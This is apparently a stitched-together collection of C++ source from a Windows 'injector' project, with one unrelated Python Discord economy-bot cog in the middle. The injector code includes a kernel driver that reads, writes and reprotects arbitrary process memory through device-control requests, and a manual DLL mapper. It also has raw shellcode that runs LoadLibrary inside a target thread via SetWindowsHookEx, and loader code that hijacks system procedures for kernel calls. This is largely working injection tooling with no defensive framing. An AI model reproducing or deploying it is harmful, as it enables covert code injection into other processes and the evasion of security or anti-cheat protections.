std::uintptr_t Loader::GetImageExport( std::uintptr_t image, const std::string& name )
{
	if( !image )
	{
		TRACE( "%s: image is 0!", __FUNCTION__ );
		return 0;
	}

	const auto image_dos_header = Read< IMAGE_DOS_HEADER >( image );

	if( image_dos_header.e_magic != IMAGE_DOS_SIGNATURE )
	{
		TRACE( "%s: Not a valid DOS image!", __FUNCTION__ );
		return 0;
	}

	const auto image_nt_headers = Read< IMAGE_NT_HEADERS >( image + image_dos_header.e_lfanew );

	if( image_nt_headers.Signature != IMAGE_NT_SIGNATURE )
	{
		TRACE( "%s: Not a valid NT image!", __FUNCTION__ );
		return 0;
	}

	const auto& directory_entry_export = image_nt_headers.OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

	if( !directory_entry_export.VirtualAddress || !directory_entry_export.Size )
	{
		TRACE( "%s: Not a valid image export directory!", __FUNCTION__ );
		return 0;
	}

	const auto image_export_directory_data = std::make_unique< std::uint8_t[] >( directory_entry_export.Size );

	if( !ReadMemory( image + directory_entry_export.VirtualAddress, image_export_directory_data.get(), directory_entry_export.Size ) )
	{
		TRACE( "%s: ReadMemory( 0x%016llX, 0x%08X ) error!", __FUNCTION__, image + directory_entry_export.VirtualAddress, directory_entry_export.Size );
		return 0;
	}

	const auto image_export_directory = PIMAGE_EXPORT_DIRECTORY( image_export_directory_data.get() );
	const auto image_export_displacement = std::uintptr_t( image_export_directory_data.get() ) - directory_entry_export.VirtualAddress;

	const auto address_of_functions = reinterpret_cast< std::uint32_t* >( image_export_displacement + image_export_directory->AddressOfFunctions );
	const auto address_of_names = reinterpret_cast< std::uint32_t* >( image_export_displacement + image_export_directory->AddressOfNames );
	const auto address_of_name_ordinals = reinterpret_cast< std::uint16_t* >( image_export_displacement + image_export_directory->AddressOfNameOrdinals );

	for( auto i = 0ul; i < image_export_directory->NumberOfNames; i++ )
	{
		const auto export_name = std::string( PCHAR( image_export_displacement + address_of_names[ i ] ) );

		if( core::ToLower( export_name ) == core::ToLower( name ) )
		{
			const auto export_ordinal = address_of_name_ordinals[ i ];
			return ( image + address_of_functions[ export_ordinal ] );
		}
	}

	return 0;
}

bool Loader::InitializeUserCode()
{
	const auto image_native = std::uintptr_t( LoadLibraryW( L"ntdll.dll" ) );

	if( image_native )
	{
		m_user_procedure = std::uintptr_t( GetProcAddress( HMODULE( image_native ), "NtQueryInformationAtom" ) );

		if( m_user_procedure )
		{
			return true;
		}
	}

	m_image_gdi32 = std::uintptr_t( LoadLibraryW( L"gdi32full.dll" ) );

	if( !m_image_gdi32 )
	{
		m_image_gdi32 = std::uintptr_t( LoadLibraryW( L"gdi32.dll" ) );

		if( !m_image_gdi32 )
		{
			TRACE( "%s: LoadLibraryW( L\\"gdi32.dll\\" ) error! (0x%08X)", __FUNCTION__, GetLastError() );
			return false;
		}
	}

	const auto win32u = std::uintptr_t( LoadLibraryW( L"win32u.dll" ) );

	if( win32u )
	{
		m_user_procedure = std::uintptr_t( GetProcAddress( HMODULE( win32u ), "NtGdiGetCOPPCompatibleOPMInformation" ) );

		if( m_user_procedure )
		{
			m_windows_10 = true;
			return true;
		}
	}

	m_user_procedure = std::uintptr_t( GetProcAddress( HMODULE( m_image_gdi32 ), "NtGdiGetCOPPCompatibleOPMInformation" ) );

	if( !m_user_procedure )
	{
		m_user_procedure = std::uintptr_t( GetProcAddress( HMODULE( m_image_gdi32 ), "GetCOPPCompatibleOPMInformation" ) );

		if( !m_user_procedure )
		{
			TRACE( "%s: GetProcAddress( 0x%016llX, \\"NtGdiGetCOPPCompatibleOPMInformation\\" ) error! (0x%08X)", __FUNCTION__, m_image_gdi32, GetLastError() );
			return false;
		}

		m_windows_7 = true;
	}

	return true;
}

bool Loader::InitializeKernelCode()
{
	m_image_ntoskrnl = GetSystemImage( "ntoskrnl.exe" );

`,xh=`// manual_map.cpp — usermode manual mapper (IAT resolution + relocation + section copy)
// Source: desktop 3-15/injector-master/Loader/core/mmaps.cpp

PVOID rva_va(uintptr_t rva, PIMAGE_NT_HEADERS nt_head, PVOID local_image)
{
	PIMAGE_SECTION_HEADER p_first_sect = IMAGE_FIRST_SECTION(nt_head);
	for (PIMAGE_SECTION_HEADER p_section = p_first_sect;
	     p_section < p_first_sect + nt_head->FileHeader.NumberOfSections;
	     p_section++)
	{
		if (rva >= p_section->VirtualAddress &&
		    rva < p_section->VirtualAddress + p_section->Misc.VirtualSize)
			return (PUCHAR)local_image + p_section->PointerToRawData + (rva - p_section->VirtualAddress);
	}
	return NULL;
}

uintptr_t resolve_func_addr(LPCSTR modname, LPCSTR modfunc)
{
	HMODULE h_module = LoadLibraryExA(modname, NULL, DONT_RESOLVE_DLL_REFERENCES);
	uintptr_t func_offset = (uintptr_t)GetProcAddress(h_module, modfunc);
	func_offset -= (uintptr_t)h_module;
	FreeLibrary(h_module);
	return func_offset;
}

extern "C" NTSYSAPI PIMAGE_NT_HEADERS NTAPI RtlImageNtHeader(PVOID Base);

BOOL resolve_import(PVOID p_local_img)
{
	const auto image_nt_headers = RtlImageNtHeader(p_local_img);
	if (!image_nt_headers)
		TRACE("Invalid PE Headers");

	TRACE("Resolving Imports...");

	PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)rva_va(
		image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,
		image_nt_headers, p_local_img);

	if (!image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
	    || !image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
		return true;

	LPSTR module_name = NULL;
	while ((module_name = (LPSTR)rva_va(import_desc->Name, image_nt_headers, p_local_img)))
	{
		uintptr_t base_image;
		base_image = call_remote_load_library(module_name);

		if (!base_image)
			return false;

		PIMAGE_THUNK_DATA ih_data = (PIMAGE_THUNK_DATA)rva_va(
			import_desc->FirstThunk, image_nt_headers, p_local_img);

		while (ih_data->u1.AddressOfData)
		{
			if (ih_data->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				ih_data->u1.Function = base_image +
					resolve_func_addr(module_name, (LPCSTR)(ih_data->u1.Ordinal & 0xFFFF));
			}
			else
			{
				IMAGE_IMPORT_BY_NAME* ibn = (PIMAGE_IMPORT_BY_NAME)rva_va(
					ih_data->u1.AddressOfData, image_nt_headers, p_local_img);
				ih_data->u1.Function = base_image + resolve_func_addr(module_name, (LPCSTR)ibn->Name);
				TRACE("%s: %s: [0x%016llX]", __FUNCTION__, ibn->Name, ih_data->u1.Function);
			}
			ih_data++;
		}
		import_desc++;
	}
	return true;
}
`,Eh=`// mem_dispatch.cpp — kernel IRP_MJ_DEVICE_CONTROL dispatch with per-control memory ops (read/write/query/protect)
// Source: D:/BackupFolder/desktop 1114/injector-master/Driver/control/controls.cpp

	return status;
}

NTSTATUS OnUserMemoryRead( const UserMemoryReadRequest* const request, UserMemoryReadResponse* response )
{
	auto status = STATUS_SUCCESS;

	if( request->IsValid() )
	{
		win32::Process process( request->m_process_id );

		if( process.IsValid() )
		{
			auto from_process = process.GetProcess();
			auto from_address = memory::ToPointer( request->m_address );
			auto to_process = PsGetCurrentProcess();
			auto to_address = memory::ToPointer( request->m_data );
			auto buffer_size = request->m_size;
			auto number_of_bytes_copied = static_cast< SIZE_T >( 0 );

			status = MmCopyVirtualMemory( from_process, from_address, to_process, to_address, buffer_size, UserMode, &number_of_bytes_copied );

			if( NT_SUCCESS( status ) )
			{
				response->m_size = static_cast< std::size_t >( number_of_bytes_copied );
			}
			else
			{
				TRACE( "%s: MmCopyVirtualMemory( ... ) error! (0x%08X)", __FUNCTION__, status );
			}
		}
		else
		{
			status = process.GetStatus();
			TRACE( "%s: process.IsValid() error! (0x%08X)", __FUNCTION__, process.GetStatus() );
		}
	}
	else
	{
		status = STATUS_INVALID_PARAMETER_1;
		TRACE( "%s: request->IsValid() error!", __FUNCTION__ );
	}

	response->m_status = status;
	return status;
}

NTSTATUS OnUserMemoryWrite( const UserMemoryWriteRequest* const request, UserMemoryWriteResponse* response )
{
	auto status = STATUS_SUCCESS;

	if( request->IsValid() )
	{
		win32::Process process( request->m_process_id );

		if( process.IsValid() )
		{
			auto from_process = PsGetCurrentProcess();
			auto from_address = memory::ToPointer( request->m_data );
			auto to_process = process.GetProcess();
			auto to_address = memory::ToPointer( request->m_address );
			auto buffer_size = request->m_size;
			auto number_of_bytes_copied = static_cast< SIZE_T >( 0 );

			status = MmCopyVirtualMemory( from_process, from_address, to_process, to_address, buffer_size, UserMode, &number_of_bytes_copied );

			if( NT_SUCCESS( status ) )
			{
				response->m_size = static_cast< std::size_t >( number_of_bytes_copied );
			}
			else
			{
				TRACE( "%s: MmCopyVirtualMemory( ... ) error! (0x%08X)", __FUNCTION__, status );
			}
		}
		else
		{
			status = process.GetStatus();
			TRACE( "%s: process.IsValid() error! (0x%08X)", __FUNCTION__, process.GetStatus() );
		}
	}
	else
	{
		status = STATUS_INVALID_PARAMETER_1;
		TRACE( "%s: request->IsValid() error!", __FUNCTION__ );
	}

	response->m_status = status;
	return status;
}

NTSTATUS OnUserMemoryQuery( const UserMemoryQueryRequest* const request, UserMemoryQueryResponse* response )
{
	auto status = STATUS_SUCCESS;

	if( request->IsValid() )
	{
		win32::Process process( request->m_process_id );

		if( process.IsValid() )
		{
			process.Attach();

			auto current_process = NtCurrentProcess();
			auto base_address = memory::ToPointer( request->m_address );

			SIZE_T return_length = 0;

			MEMORY_BASIC_INFORMATION information = { };
			status = ZwQueryVirtualMemory( current_process, base_address, MemoryBasicInformation, &information, sizeof( information ), &return_length );

			if( NT_SUCCESS( status ) )
			{
				auto destination = memory::ToAddress( response ) + FIELD_OFFSET( UserMemoryQueryResponse, m_base_address );
				std::memcpy( memory::ToPointer( destination ), &information, sizeof( information ) );
			}
			else
			{
				TRACE( "%s: ZwQueryVirtualMemory( ... ) error! (0x%08X)", __FUNCTION__, status );
			}

			process.Detach();
		}
		else
		{
			status = process.GetStatus();
			TRACE( "%s: process.IsValid() error! (0x%08X)", __FUNCTION__, process.GetStatus() );
		}
	}
	else
	{
		status = STATUS_INVALID_PARAMETER_1;
		TRACE( "%s: request->IsValid() error!", __FUNCTION__ );
	}

	response->m_status = status;
	return status;
}

NTSTATUS OnUserMemoryProtect(const UserMemoryProtectRequest* const request, UserMemoryProtectResponse* response)
{
	auto status = STATUS_SUCCESS;

	if (request->IsValid())
	{
		win32::Process process(request->m_process_id);

		if (process.IsValid())
		{
			KAPC_STATE apc;
			KeStackAttachProcess(process.GetProcess(), &apc);
			{
				auto from_address = memory::ToPointer(request->m_address);
				auto buffer_size = request->m_size;
				auto protection_type = request->m_protection;

				ULONG old;
				status = ZwProtectVirtualMemory(ZwCurrentProcess(), &from_address, &buffer_size, protection_type, &old);//MmCopyVirtualMemory(from_process, from_address, to_process, to_address, buffer_size, UserMode, &number_of_bytes_copied);

				if (NT_SUCCESS(status))
				{
					response->m_size = static_cast<std::size_t>(old);
				}
				else
				{
					TRACE("%s: MmCopyVirtualMemory( ... ) error! (0x%08X)", __FUNCTION__, status);
				}
			}
			KeUnstackDetachProcess(&apc);
		}
		else
		{
			status = process.GetStatus();
			TRACE("%s: process.IsValid() error! (0x%08X)", __FUNCTION__, process.GetStatus());
		}
	}
	else
	{
		status = STATUS_INVALID_PARAMETER_1;
		TRACE("%s: request->IsValid() error!", __FUNCTION__);
	}

	response->m_status = status;
	return status;
}

void* GetSystemAddressForMdl( PMDL descriptor, ULONG priority )
{
	if( descriptor->MdlFlags & ( MDL_MAPPED_TO_SYSTEM_VA | MDL_SOURCE_IS_NONPAGED_POOL ) )
	{
		return descriptor->MappedSystemVa;
	}

	return MmMapLockedPagesSpecifyCache( descriptor, KernelMode, MmNonCached, nullptr, FALSE, priority );
}

NTSTATUS DispatchDeviceControl( DEVICE_OBJECT* device_object, IRP* irp )
{
	UNREFERENCED_PARAMETER( device_object );

	auto status = STATUS_SUCCESS;
	auto information = static_cast< std::uint64_t >( 0 );

	const auto io_stack = IoGetCurrentIrpStackLocation( irp );

	if( io_stack )
	{
		const auto io_request_size = io_stack->Parameters.DeviceIoControl.InputBufferLength;
		const auto io_response_size = io_stack->Parameters.DeviceIoControl.OutputBufferLength;

		if( io_request_size >= sizeof( BaseRequest ) && io_response_size >= sizeof( BaseResponse ) )
		{
			const auto io_request_data = irp->AssociatedIrp.SystemBuffer;

			if( io_request_data )
			{
				auto io_response_data = GetSystemAddressForMdl( irp->MdlAddress, NormalPagePriority );

				if( io_response_data )
				{
					switch( io_stack->MajorFunction )
					{
						case IRP_MJ_DEVICE_CONTROL:
						{
							const auto io_operation = static_cast< Operation >( io_stack->Parameters.DeviceIoControl.IoControlCode );

							switch( io_operation )
							{
								case Operation::QueryDriverVersion:
								{
									const auto request = static_cast< const QueryDriverVersionRequest* >( io_request_data );

									if( io_request_size >= sizeof( QueryDriverVersionRequest ) )
									{
										QueryDriverVersionResponse response = { SignatureResponse };
										
										status = OnQueryDriverVersion( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::QueryDriverSecure:
								{
									const auto request = static_cast< const QueryDriverSecureRequest* >( io_request_data );

									if( io_request_size >= sizeof( QueryDriverSecureRequest ) )
									{
										QueryDriverSecureResponse response = { SignatureResponse };

										status = OnQueryDriverSecure( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::QueryDriverQuit:
								{
									const auto request = static_cast< const QueryDriverQuitRequest* >( io_request_data );

									if( io_request_size >= sizeof( QueryDriverQuitRequest ) )
									{
										QueryDriverQuitResponse response = { SignatureResponse };

										status = OnQueryDriverQuit( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::QueryUserProcess:
								{
									const auto request = static_cast< const QueryUserProcessRequest* >( io_request_data );

									if( io_request_size >= sizeof( QueryUserProcessRequest ) )
									{
										QueryUserProcessResponse response = { SignatureResponse };

										status = OnQueryUserProcess( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::QueryUserImage:
								{
									const auto request = static_cast< const QueryUserImageRequest* >( io_request_data );

									if( io_request_size >= sizeof( QueryUserImageRequest ) )
									{
										QueryUserImageResponse response = { SignatureResponse };

										status = OnQueryUserImage( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::UserMemoryCommit:
								{
									const auto request = static_cast< UserMemoryCommitRequest* >( io_request_data );

									if( io_request_size >= sizeof( UserMemoryCommitRequest ) )
									{
										UserMemoryCommitResponse response = { SignatureResponse };
										status = FuckedUpMemoryAllocate( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::UserMemoryFree:
								{
									const auto request = static_cast< const UserMemoryFreeRequest* >( io_request_data );

									if( io_request_size >= sizeof( UserMemoryFreeRequest ) )
									{
										UserMemoryFreeResponse response = { SignatureResponse };

										status = OnUserMemoryFree( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::UserMemoryRead:
								{
									const auto request = static_cast< const UserMemoryReadRequest* >( io_request_data );

									if( io_request_size >= sizeof( UserMemoryReadRequest ) )
									{
										UserMemoryReadResponse response = { SignatureResponse };
										status = OnUserMemoryRead( request, &response );
										information = sizeof( response );
										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::UserMemoryWrite:
								{
									const auto request = static_cast< const UserMemoryWriteRequest* >( io_request_data );

									if( io_request_size >= sizeof( UserMemoryWriteRequest ) )
									{
										UserMemoryWriteResponse response = { SignatureResponse };

										status = OnUserMemoryWrite( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::UserMemoryQuery:
								{
									const auto request = static_cast< const UserMemoryQueryRequest* >( io_request_data );

									if( io_request_size >= sizeof( UserMemoryQueryRequest ) )
									{
										UserMemoryQueryResponse response = { SignatureResponse };

										status = OnUserMemoryQuery( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::UserMemoryProtect:
								{
									const auto request = static_cast<const UserMemoryProtectRequest*>(io_request_data);

									if (io_request_size >= sizeof(UserMemoryProtectRequest))
									{
										UserMemoryProtectResponse response = { SignatureResponse };

										status = OnUserMemoryProtect(request, &response);
										information = sizeof(response);

										std::memcpy(io_response_data, &response, sizeof(response));
									}

									break;
								}
							}
							break;
						}
					}
				}
			}
		}
	}

	if( information )
	{
		irp->IoStatus.Status = status;
		irp->IoStatus.Information = information;

		IoCompleteRequest( irp, IO_NO_INCREMENT );
	}
	else
	{
		status = STATUS_NOT_IMPLEMENTED;
	}

	return status;
}

NTSTATUS DeviceControl( DEVICE_OBJECT* device_object, IRP* irp )
{
	auto status = STATUS_SUCCESS;

	__try
	{
		status = DispatchDeviceControl( device_object, irp );

		if( status == STATUS_NOT_IMPLEMENTED )
		{
			status = g_driver_dispatch( device_object, irp );
		}
	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		TRACE( "%s: Exception occurred! (0x%08X)", __FUNCTION__, GetExceptionCode() );
		status = g_driver_dispatch( device_object, irp );
	}

	return status;
}

NTSTATUS DeviceControlComplete( IRP* irp, NTSTATUS status, ULONG_PTR information )
{
	irp->IoStatus.Status = status;
	irp->IoStatus.Information = information;

	IoCompleteRequest( irp, IO_NO_INCREMENT );
	return irp->IoStatus.Status;
}

`,yh=`# minabot_cog.py — economy cog: SQLite-backed balance, daily reward, and shop with role assignment
# Source: Desktop/minaBot2/cogs/economy.py

import discord
from discord.ext import commands
import asyncio
from datetime import datetime
from typing import Optional
from utils import utility
from db import db

utility_api = utility.utility_api()
db_manager  = db.database_manager()
BOT_COLOR   = utility_api.get_bot_color()


class Economy(commands.Cog):
    """Economy system with currency, shop, and gambling."""

    def __init__(self, bot):
        self.bot      = bot
        self.utility  = utility_api
        self.db       = db_manager

        self.currency_name  = "coins"
        self.currency_emoji = "🪙"
        self.daily_amount   = 500
        self.daily_cooldown = 86400    # 24 h

    async def cog_check(self, ctx):
        return self.utility.check_white_listed(ctx.author.id)

    def get_user_data(self, user_id: int):
        """Return (or lazily create) the economy row for *user_id*."""
        data = self.db.record("SELECT * FROM economy WHERE user_id = ?", user_id)
        if not data:
            self.db.execute(
                """INSERT INTO economy
                   (user_id, balance, bank, last_daily, last_work, total_earned, total_spent)
                   VALUES (?, 0, 0, 0, 0, 0, 0)""",
                user_id,
            )
            self.db.commit()
            data = self.db.record("SELECT * FROM economy WHERE user_id = ?", user_id)
        return data

    def update_balance(self, user_id: int, amount: int, update_bank: bool = False):
        col = "bank" if update_bank else "balance"
        self.db.execute(
            f"UPDATE economy SET {col} = {col} + ? WHERE user_id = ?",
            amount, user_id,
        )
        self.db.commit()

    def log_transaction(self, user_id: int, amount: int, trans_type: str, description: str):
        ts = int(datetime.utcnow().timestamp())
        self.db.execute(
            "INSERT INTO transactions (user_id, amount, type, description, timestamp) VALUES (?, ?, ?, ?, ?)",
            user_id, amount, trans_type, description, ts,
        )
        self.db.commit()

    @commands.command(name="daily")
    async def daily(self, ctx):
        """Claim daily coins (24-hour cooldown)."""
        data      = self.get_user_data(ctx.author.id)
        last_daily = data[3]
        now        = int(datetime.utcnow().timestamp())

        if now - last_daily < self.daily_cooldown:
            time_left = self.daily_cooldown - (now - last_daily)
            hours, minutes = divmod(time_left, 3600)
            minutes //= 60
            return await ctx.send(
                f"{ctx.author.mention}, already claimed! come back in **{hours}h {minutes}m**",
                delete_after=10,
            )

        self.update_balance(ctx.author.id, self.daily_amount)
        self.db.execute(
            "UPDATE economy SET last_daily = ?, total_earned = total_earned + ? WHERE user_id = ?",
            now, self.daily_amount, ctx.author.id,
        )
        self.db.commit()
        self.log_transaction(ctx.author.id, self.daily_amount, "daily", "Daily reward claimed")

        embed = discord.Embed(
            description=(
                f"{self.currency_emoji} **you claimed {self.daily_amount:,} {self.currency_name}!**\\n"
                "come back in 24 hours for more."
            ),
            color=BOT_COLOR,
        )
        await ctx.send(embed=embed)

    @commands.command(name="balance", aliases=["bal"])
    async def balance(self, ctx, member: Optional[discord.Member] = None):
        target = member or ctx.author
        data   = self.get_user_data(target.id)
        wallet, bank = data[1], data[2]

        embed = discord.Embed(title=f"{target.display_name}'s balance", color=BOT_COLOR)
        embed.add_field(name=f"{self.currency_emoji} wallet", value=f"{wallet:,}", inline=True)
        embed.add_field(name="🏦 bank",   value=f"{bank:,}",   inline=True)
        embed.add_field(name="💰 total",  value=f"{wallet + bank:,}", inline=True)
        embed.set_thumbnail(url=target.display_avatar.url)
        await ctx.send(embed=embed)


async def setup(bot: commands.Bot):
    await bot.add_cog(Economy(bot))
`,Mh=`// mm_map_section.cpp — manual mapper internals: section copy, base relocation, import descriptor walk
// Source: D:/BackupFolder/desktop 1114/injector-master/Loader/core/mmaps.cpp

IMAGE_NT_HEADERS* GetImageNtHeaders( std::uintptr_t image )
{
	if( !image )
		return nullptr;

	const auto image_dos_header = reinterpret_cast< IMAGE_DOS_HEADER* >( image );

	if( image_dos_header->e_magic != IMAGE_DOS_SIGNATURE )
		return nullptr;

	const auto image_nt_headers = reinterpret_cast< IMAGE_NT_HEADERS* >( image + image_dos_header->e_lfanew );

	if( image_nt_headers->Signature != IMAGE_NT_SIGNATURE )
		return nullptr;

	return image_nt_headers;
}

bool MapImageHeader( std::uintptr_t image, std::uintptr_t image_data )
{
	const auto image_nt_headers = GetImageNtHeaders( image_data );

	if( !image_nt_headers )
	{
		return false;
	}

	const auto image_size = image_nt_headers->OptionalHeader.SizeOfHeaders;

	E_LOG( "%s: [0x%016llX] -> [0x%016llX] (0x%08X)", __FUNCTION__, image_data, image, image_size );

	const auto image_pointer = memory::ToPointer( image );
	const auto image_data_pointer = memory::ToPointer( image_data );

	std::memcpy( image_pointer, image_data_pointer, image_size );

	return true;
}

bool MapImageSection( std::uintptr_t image, std::uintptr_t image_data )
{
	const auto image_nt_headers = GetImageNtHeaders( image );

	if( !image_nt_headers )
		return false;

	const auto image_section_header = IMAGE_FIRST_SECTION( image_nt_headers );

	if( !image_section_header )
		return false;

	for( std::uint16_t i = 0; i < image_nt_headers->FileHeader.NumberOfSections; i++ )
	{
		const auto image_section = &image_section_header[ i ];

		if( !image_section )
			continue;

		char section_name[ 9 ] = { };
		std::memcpy( section_name, image_section->Name, sizeof( image_section->Name ) );

		E_LOG( "%s: \\"%s\\" [0x%016llX] -> [0x%016llX] (0x%08X)", __FUNCTION__, section_name, image_data + image_section->PointerToRawData, image + image_section->VirtualAddress, image_section->SizeOfRawData );

		const auto destination = memory::ToPointer( image + image_section->VirtualAddress );
		const auto source = memory::ToPointer( image_data + image_section->PointerToRawData );
		const auto size = static_cast< std::size_t >( image_section->SizeOfRawData );

		std::memcpy( destination, source, size );
	}

	return true;
}

struct ImageRelocationData
{
	std::uintptr_t m_address = 0;
	std::uint16_t* m_item = nullptr;
	std::uint32_t m_count = 0;
};

struct ImageRelocationEntry
{
	std::uint32_t VirtualAddress;
	std::uint32_t SizeOfBlock;
	std::uint16_t TypeOffset[ 1 ] = { };
};

bool MapImageRelocation( std::uintptr_t image, std::uintptr_t image_data, IMAGE_NT_HEADERS* image_nt_headers )
{
	const auto image_data_directory = image_nt_headers->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

	if( !image_data_directory.VirtualAddress || !image_data_directory.Size )
	{
		E_LOG( "%s: No relocations...", __FUNCTION__ );
		return true;
	}

	auto base_relocation = reinterpret_cast< IMAGE_BASE_RELOCATION* >( image_data + image_data_directory.VirtualAddress );
	auto base_relocation_end = memory::ToAddress( base_relocation ) + image_data_directory.Size;

	while( base_relocation && base_relocation->VirtualAddress && base_relocation->SizeOfBlock && base_relocation->VirtualAddress < base_relocation_end )
	{
		ImageRelocationData image_relocation =
		{
			image_data + base_relocation->VirtualAddress,
			reinterpret_cast< std::uint16_t* >( memory::ToAddress( base_relocation ) + sizeof( IMAGE_BASE_RELOCATION ) ),
			static_cast< std::uint32_t >( ( base_relocation->SizeOfBlock - sizeof( IMAGE_BASE_RELOCATION ) ) / sizeof( std::uint16_t ) ),
		};

		for( auto i = 0u; i < image_relocation.m_count; i++ )
		{
			const auto type = static_cast< std::uint16_t >( image_relocation.m_item[ i ] >> 12 );
			const auto offset = static_cast< std::uint16_t >( image_relocation.m_item[ i ] & 0xFFF );

			if( type == IMAGE_REL_BASED_HIGHLOW ||
					type == IMAGE_REL_BASED_DIR64 )
			{
				E_LOG( "%s: [0x%016llX] [0x%04X] [0x%04X] (0x%016llX)", __FUNCTION__, image_relocation.m_address, type, offset, image - image_nt_headers->OptionalHeader.ImageBase );
				*reinterpret_cast< std::uintptr_t* >( image_relocation.m_address + offset ) += ( image - image_nt_headers->OptionalHeader.ImageBase );
			}
		}

		base_relocation = reinterpret_cast< IMAGE_BASE_RELOCATION* >( memory::ToAddress( base_relocation ) + base_relocation->SizeOfBlock );
	}

	return true;
}

BYTE remote_load_library[96] =
{
	0x48, 0x83, 0xEC, 0x38, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x20,
	0x83, 0x38, 0x00, 0x75, 0x3D, 0x48, 0x8B, 0x44, 0x24, 0x20, 0xC7, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x40,
	0x08, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x83, 0xC0, 0x18, 0x48, 0x8B, 0xC8, 0xFF, 0x54, 0x24, 0x28, 0x48, 0x8B,
	0x4C, 0x24, 0x20, 0x48, 0x89, 0x41, 0x10, 0x48, 0x8B, 0x44, 0x24, 0x20, 0xC7, 0x00, 0x02, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC
}; DWORD shell_data_offset = 0x6;

/////////////////////////////////
typedef struct _load_library_struct
{
	int status;
	uintptr_t fn_load_library_a;
	uintptr_t module_base;
	char module_name[80];
}load_library_struct;

typedef struct _main_struct
{
	int status;
	uintptr_t fn_dll_main;
	HINSTANCE dll_base;
} main_struct;
/////////////////////////////////

/////////////////////////////////
uintptr_t call_remote_load_library(LPCSTR dll_name)
{
	auto& driver = io::DriverControl::Instance();

	/////////////////////////////////
	HMODULE nt_dll = LoadLibraryW(L"ntdll.dll");
	/////////////////////////////////

	/////////////////////////////////
	auto alloc_shell_code = driver.Commit(PAGE_SIZE, PAGE_READWRITE);
	DWORD shell_size = sizeof(remote_load_library) + sizeof(load_library_struct);
	PVOID alloc_local = VirtualAlloc(NULL, shell_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	/////////////////////////////////

	/////////////////////////////////
	RtlCopyMemory(alloc_local, &remote_load_library, sizeof(remote_load_library));
	uintptr_t shell_data = (uintptr_t)alloc_shell_code.m_address + sizeof(remote_load_library);
	*(uintptr_t*)((uintptr_t)alloc_local + shell_data_offset) = shell_data;
	load_library_struct* ll_data = (load_library_struct*)((uintptr_t)alloc_local + sizeof(remote_load_library));
	ll_data->fn_load_library_a = (uintptr_t)LoadLibraryA;
	strcpy_s(ll_data->module_name, 80, dll_name);
	/////////////////////////////////

	/////////////////////////////////
	driver.WriteMemory(alloc_shell_code.m_address, alloc_local, shell_size);
	HHOOK h_hook = SetWindowsHookExW(WH_GETMESSAGE, (HOOKPROC)alloc_shell_code.m_address, nt_dll, driver.GetThreadId());
	/////////////////////////////////

	/////////////////////////////////
	while (ll_data->status != 2)
	{
		PostThreadMessage(driver.GetThreadId(), WM_NULL, 0, 0);
		driver.ReadMemory(shell_data, (PVOID)ll_data, sizeof(load_library_struct));
		Sleep(10);
	} uintptr_t mod_base = ll_data->module_base;
	/////////////////////////////////

	/////////////////////////////////
	UnhookWindowsHookEx(h_hook);
	driver.FreeMemory(alloc_shell_code.m_address, shell_size, MEM_RELEASE);
	VirtualFree(alloc_local, 0, MEM_RELEASE);
	/////////////////////////////////

	return mod_base;
}

PVOID rva_va(uintptr_t rva, PIMAGE_NT_HEADERS nt_head, PVOID local_image)
{
	PIMAGE_SECTION_HEADER p_first_sect = IMAGE_FIRST_SECTION(nt_head);
	for (PIMAGE_SECTION_HEADER p_section = p_first_sect; p_section < p_first_sect + nt_head->FileHeader.NumberOfSections; p_section++)
		if (rva >= p_section->VirtualAddress && rva < p_section->VirtualAddress + p_section->Misc.VirtualSize)
			return (PUCHAR)local_image + p_section->PointerToRawData + (rva - p_section->VirtualAddress);

	return NULL;
}

uintptr_t resolve_func_addr(LPCSTR modname, LPCSTR modfunc)
{
	HMODULE h_module = LoadLibraryExA(modname, NULL, DONT_RESOLVE_DLL_REFERENCES);
	uintptr_t func_offset = (uintptr_t)GetProcAddress(h_module, modfunc);
	func_offset -= (uintptr_t)h_module;
	FreeLibrary(h_module);

	return func_offset;
}

extern "C" NTSYSAPI PIMAGE_NT_HEADERS NTAPI RtlImageNtHeader(PVOID Base);
BOOL resolve_import(PVOID p_local_img)
{
	const auto image_nt_headers = RtlImageNtHeader(p_local_img);
	if (!image_nt_headers)
		TRACE("Invalid PE Headers");

	TRACE("Resolving Imports...");

